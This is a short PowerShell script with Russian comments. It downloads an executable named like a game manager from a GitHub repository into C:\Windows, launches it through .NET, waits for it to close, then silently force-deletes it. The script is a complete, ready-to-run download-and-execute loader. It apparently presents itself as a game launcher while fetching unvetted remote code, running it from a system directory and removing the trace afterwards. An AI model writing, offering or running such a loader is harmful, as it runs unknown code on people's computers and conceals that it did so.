$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.exe"
$TempDir = "C:\Windows"
$TempFile = Join-Path $TempDir "globalgamemanage.exe"

# Скачиваем файл
Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# Настраиваем запуск через .NET
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $TempFile
$psi.UseShellExecute = $false

# Запускаем процесс
$proc = [System.Diagnostics.Process]::Start($psi)

# Ждём завершения
$proc.WaitForExit()

# Удаляем файл после закрытия
Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
